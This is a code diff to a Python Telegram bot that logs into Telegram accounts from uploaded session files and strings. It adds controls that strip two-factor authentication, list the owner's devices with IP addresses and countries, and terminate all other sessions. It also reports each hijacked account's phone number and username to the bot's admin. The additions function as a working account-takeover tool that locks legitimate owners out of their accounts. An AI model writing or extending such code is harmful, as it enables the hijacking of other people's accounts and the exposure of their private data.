@@ -10,12 +10,15 @@ import magic
 import rarfile
 from aiogram import Bot, Dispatcher, types, Router
 from aiogram.filters import Command
-from aiogram.types import Message, ContentType
+from aiogram.types import Message, ContentType, CallbackQuery
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
 from telethon.errors import ApiIdInvalidError, AccessTokenInvalidError
+from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
+from telethon.tl.functions.auth import ResetAuthorizationsRequest
+from telethon.tl.types import Authorization
 
 # ========== DEFAULT CONFIG ==========
 DEFAULT_API_ID = 20598937
@@ -62,8 +65,9 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# Store active Telethon clients
+# Store active Telethon clients and their info
 clients = {}
+client_info = {}  # Store additional client info like phone number, user_id, etc.
 
 # FSM States for admin panel
 class ConfigStates(StatesGroup):
@@ -136,6 +140,45 @@ def find_string_sessions_in_text(root_dir: str):
                 continue
     return found
 
+async def get_client_info(client, session_name: str):
+    """Get client information like phone, user_id, etc."""
+    try:
+        me = await client.get_me()
+        client_info[session_name] = {
+            'phone': me.phone,
+            'user_id': me.id,
+            'username': me.username,
+            'first_name': me.first_name,
+            'last_name': me.last_name
+        }
+        return client_info[session_name]
+    except Exception as e:
+        print(f"Error getting client info for {session_name}: {e}")
+        return None
+
+async def send_account_buttons(chat_id: int, session_name: str, client_info: dict):
+    """Send management buttons for a successful account login."""
+    phone = client_info.get('phone', 'Unknown')
+    username = client_info.get('username', 'No username')
+    first_name = client_info.get('first_name', 'Unknown')
+    
+    keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
+        [types.InlineKeyboardButton(text="🔓 Remove 2FA", callback_data=f"remove_2fa:{session_name}")],
+        [types.InlineKeyboardButton(text="📱 Show Devices", callback_data=f"show_devices:{session_name}")],
+        [types.InlineKeyboardButton(text="🚪 Terminate Other Sessions", callback_data=f"terminate_others:{session_name}")]
+    ])
+    
+    message_text = (
+        f"✅ Account Login Successful!\n\n"
+        f"📱 Phone: `{phone}`\n"
+        f"👤 Name: {first_name}\n"
+        f"🔗 Username: @{username}\n"
+        f"📛 Session: `{session_name}`\n\n"
+        f"Choose management option:"
+    )
+    
+    await bot.send_message(chat_id, message_text, reply_markup=keyboard, parse_mode="Markdown")
+
 async def start_telethon_from_file(session_path: str, session_name: str):
     """Start Telethon client from a .session file."""
     dest_base = os.path.join(SESSIONS_DIR, safe_name(session_name))
@@ -148,6 +191,9 @@ async def start_telethon_from_file(session_path: str, session_name: str):
     try:
         client = TelegramClient(dest_base, config["api_id"], config["api_hash"])
         await client.start()
+        
+        # Get client info
+        info = await get_client_info(client, session_name)
         
         @client.on(events.NewMessage(incoming=True))
         async def handler(event):
@@ -165,6 +211,11 @@ async def start_telethon_from_file(session_path: str, session_name: str):
                 print(f"Handler error: {ee}")
 
         clients[session_name] = client
+        
+        # Send account management buttons
+        if info:
+            await send_account_buttons(config["admin_id"], session_name, info)
+        
         print(f"Started session (file): {session_name}")
         return True
     except ApiIdInvalidError as e:
@@ -183,6 +234,9 @@ async def start_telethon_from_string(session_string: str, session_name: str):
         client = TelegramClient(ss, config["api_id"], config["api_hash"])
         await client.start()
         
+        # Get client info
+        info = await get_client_info(client, session_name)
+        
         @client.on(events.NewMessage(incoming=True))
         async def handler(event):
             try:
@@ -199,6 +253,11 @@ async def start_telethon_from_string(session_string: str, session_name: str):
                 print(f"Handler error: {ee}")
 
         clients[session_name] = client
+        
+        # Send account management buttons
+        if info:
+            await send_account_buttons(config["admin_id"], session_name, info)
+        
         print(f"Started session (string): {session_name}")
         return True
     except ApiIdInvalidError as e:
@@ -209,6 +268,57 @@ async def start_telethon_from_string(session_string: str, session_name: str):
     except Exception as e:
         print(f"Start client from string failed: {e}")
         return False
+
+# Account management functions
+async def remove_2fa(client, session_name: str):
+    """Remove 2FA from account."""
+    try:
+        # Try to disable 2FA by setting empty password
+        await client.edit_2fa(new_password='')
+        return True, "✅ 2FA removed successfully"
+    except Exception as e:
+        try:
+            # Alternative method
+            await client.reset_2fa()
+            return True, "✅ 2FA reset successfully"
+        except Exception as e2:
+            return False, f"❌ Failed to remove 2FA: {str(e)}"
+
+async def get_active_devices(client, session_name: str):
+    """Get list of active devices/sessions."""
+    try:
+        authorizations = await client(GetAuthorizationsRequest())
+        devices = []
+        
+        for auth in authorizations.authorizations:
+            device_info = {
+                'hash': auth.hash,
+                'device_model': auth.device_model or 'Unknown',
+                'platform': auth.platform or 'Unknown',
+                'system_version': auth.system_version or 'Unknown',
+                'api_id': auth.api_id,
+                'app_name': auth.app_name or 'Unknown',
+                'app_version': auth.app_version or 'Unknown',
+                'date_created': auth.date_created.strftime('%Y-%m-%d %H:%M:%S'),
+                'date_active': auth.date_active.strftime('%Y-%m-%d %H:%M:%S'),
+                'ip': auth.ip,
+                'country': auth.country,
+                'current': auth.current
+            }
+            devices.append(device_info)
+        
+        return True, devices
+    except Exception as e:
+        return False, f"❌ Failed to get devices: {str(e)}"
+
+async def terminate_other_sessions(client, session_name: str):
+    """Terminate all other active sessions except current one."""
+    try:
+        # Reset all other authorizations
+        await client(ResetAuthorizationsRequest())
+        return True, "✅ All other sessions terminated successfully"
+    except Exception as e:
+        return False, f"❌ Failed to terminate other sessions: {str(e)}"
 
 # ========== Bot Handlers ==========
 @router.message(Command("start"))
@@ -223,7 +333,8 @@ async def cmd_start(message: Message):
         "/list - Show active sessions\n"
         "/stop - Stop all sessions\n"
         "/outall - Logout all accounts\n"
-        "/logout <name> - Logout specific session\n\n"
+        "/logout <name> - Logout specific session\n"
+        "/devices <name> - Show devices for session\n\n"
         "Send me .session / zip / tar / rar / txt / json files and I will start the sessions automatically."
     )
 
@@ -290,6 +401,88 @@ async def process_config_callback(callback_query: types.CallbackQuery, state: FS
     
     await callback_query.answer()
 
+# Account management callbacks
+@router.callback_query(lambda c: c.data.startswith(('remove_2fa:', 'show_devices:', 'terminate_others:')))
+async def process_account_management(callback_query: CallbackQuery):
+    if callback_query.from_user.id != config["admin_id"]:
+        await callback_query.answer("❌ Access denied")
+        return
+    
+    data_parts = callback_query.data.split(':', 1)
+    action = data_parts[0]
+    session_name = data_parts[1]
+    
+    client = clients.get(session_name)
+    if not client:
+        await callback_query.answer("❌ Session not found")
+        return
+    
+    await callback_query.answer("⏳ Processing...")
+    
+    try:
+        if action == "remove_2fa":
+            success, message = await remove_2fa(client, session_name)
+            await callback_query.message.answer(f"🔓 2FA Removal - {session_name}\n\n{message}")
+            
+        elif action == "show_devices":
+            success, result = await get_active_devices(client, session_name)
+            if success:
+                devices_text = "📱 Active Devices:\n\n"
+                for i, device in enumerate(result, 1):
+                    current_indicator = " ✅ CURRENT" if device['current'] else ""
+                    devices_text += (
+                        f"{i}. **{device['device_model']}**\n"
+                        f"   📱 {device['platform']} {device['system_version']}\n"
+                        f"   🔧 {device['app_name']} {device['app_version']}\n"
+                        f"   🌐 {device['ip']} ({device['country']})\n"
+                        f"   📅 Active: {device['date_active']}{current_indicator}\n\n"
+                    )
+                await callback_query.message.answer(devices_text, parse_mode="Markdown")
+            else:
+                await callback_query.message.answer(result)
+                
+        elif action == "terminate_others":
+            success, message = await terminate_other_sessions(client, session_name)
+            await callback_query.message.answer(f"🚪 Session Termination - {session_name}\n\n{message}")
+            
+    except Exception as e:
+        await callback_query.message.answer(f"❌ Error processing request: {str(e)}")
+
+@router.message(Command("devices"))
+async def cmd_devices(message: Message):
+    """Show devices for a specific session"""
+    if message.from_user.id != config["admin_id"]:
+        return
+
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await message.reply("Usage: /devices <session_name>")
+        return
+
+    session_name = safe_name(args[1])
+    client = clients.get(session_name)
+    if not client:
+        await message.reply(f"❌ No active session found with name: {session_name}")
+        return
+    
+    await message.reply("⏳ Fetching device information...")
+    
+    success, result = await get_active_devices(client, session_name)
+    if success:
+        devices_text = f"📱 Active Devices for {session_name}:\n\n"
+        for i, device in enumerate(result, 1):
+            current_indicator = " ✅ CURRENT" if device['current'] else ""
+            devices_text += (
+                f"{i}. **{device['device_model']}**\n"
+                f"   📱 {device['platform']} {device['system_version']}\n"
+                f"   🔧 {device['app_name']} {device['app_version']}\n"
+                f"   🌐 {device['ip']} ({device['country']})\n"
+                f"   📅 Active: {device['date_active']}{current_indicator}\n\n"
+            )
+        await message.reply(devices_text, parse_mode="Markdown")
+    else:
+        await message.reply(result)
+
 @router.message(ConfigStates.waiting_api_id)
 async def process_api_id(message: Message, state: FSMContext):
     try:
@@ -341,9 +534,9 @@ async def cmd_list(message: Message):
     if message.from_user.id != config["admin_id"]:
         return
     if clients:
-        txt = "Active sessions:\n" + "\n".join(f" - {k}" for k in clients)
+        txt = "📋 Active sessions:\n\n" + "\n".join(f"• {name} - {client_info.get(name, {}).get('phone', 'Unknown')}" for name in clients)
     else:
-        txt = "Active sessions:\n (none)"
+        txt = "📋 Active sessions:\n (none)"
     await message.reply(txt)
 
 @router.message(Command("stop"))
@@ -356,6 +549,7 @@ async def cmd_stop(message: Message):
         except:
             pass
         clients.pop(name, None)
+        client_info.pop(name, None)
     await message.reply("✅ All sessions stopped.")
 
 @router.message(Command("outall"))
@@ -378,6 +572,7 @@ async def cmd_outall(message: Message):
             await client.log_out()
             await client.disconnect()
             clients.pop(name, None)
+            client_info.pop(name, None)
             success_count += 1
             report_lines.append(f"✅ {name} - Logged out from all devices")
         except Exception as e:
@@ -394,7 +589,7 @@ async def cmd_logout(message: Message):
 
     args = message.text.split(maxsplit=1)
     if len(args) < 2:
-        await message.reply("Usage: /logout <session_name_or_phone>")
+        await message.reply("Usage: /logout <session_name>")
         return
 
     session_name = safe_name(args[1])
@@ -406,6 +601,7 @@ async def cmd_logout(message: Message):
         except:
             pass
         clients.pop(session_name, None)
+        client_info.pop(session_name, None)
         await message.reply(f"✅ Logged out from all devices: {session_name}")
     else:
         await message.reply(f"❌ No active session found with name: {session_name}")
